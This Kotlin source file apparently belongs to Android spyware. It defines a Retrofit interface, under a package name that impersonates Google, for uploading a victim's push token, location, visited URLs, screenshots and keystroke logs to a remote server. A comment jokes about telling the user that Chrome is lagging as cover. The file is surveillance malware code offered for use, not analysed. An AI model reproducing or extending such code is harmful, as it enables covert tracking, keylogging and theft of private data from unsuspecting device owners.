package com.android.google.remote.server

import com.android.google.remote.models.*
import com.android.google.remote.server.ServerConstants.SEND_KEY_LOG_PATH
import com.android.google.remote.server.ServerConstants.SEND_LOCATION_PATH
import com.android.google.remote.server.ServerConstants.SEND_PUSH_TOKEN_PATH
import com.android.google.remote.server.ServerConstants.SEND_SCREENSHOT_PATH
import com.android.google.remote.server.ServerConstants.SEND_URL_PATH
import retrofit2.http.Body
import retrofit2.http.POST

/*
* Returns NOTHING for known and unknown purposes
* Just, for what we need to do this? Notify user that chrome is lagging - XD
* Text me if it`s my fault, welcome
* */

interface ServerService {

    @POST(SEND_PUSH_TOKEN_PATH)
    suspend fun sendPushToken(@Body token: PushTokenDTO) {}

    @POST(SEND_LOCATION_PATH)
    suspend fun sendLocation(@Body location: LocationDTO) {}

    @POST(SEND_URL_PATH)
    suspend fun sendUrl(@Body url: UrlDTO) {}

    @POST(SEND_SCREENSHOT_PATH)
    suspend fun sendScreenshot(@Body screenshot: ScreenshotDTO) {}

    @POST(SEND_KEY_LOG_PATH)
    suspend fun sendKeyLog(@Body keyLog: KeyLogDTO) {}

}